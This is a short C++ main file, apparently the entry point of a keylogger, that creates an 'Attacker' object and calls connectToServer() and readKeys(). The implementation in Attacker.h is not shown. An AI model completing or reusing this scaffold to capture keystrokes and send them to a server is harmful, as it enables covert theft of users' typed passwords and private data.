#include <iostream>
#include <fstream>
#include <conio.h>
#include <thread>
#include <filesystem>
#include "Attacker.h"



int main() {
	Attacker* attacker = new Attacker();

	attacker->connectToServer();
	attacker->readKeys();

	return 0;
}